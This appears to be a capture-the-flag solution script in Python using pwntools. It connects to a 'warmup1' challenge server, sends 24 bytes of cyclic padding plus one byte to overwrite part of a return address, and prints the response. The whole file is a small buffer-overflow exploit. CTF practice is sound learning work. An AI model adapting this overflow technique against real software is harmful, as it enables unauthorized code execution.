
from pwn import *

r = remote('warmup1.ctf.maplebacon.org', 1337)

p = cyclic(24)
p += b'\x19'

r.send(p)

print(r.recv())
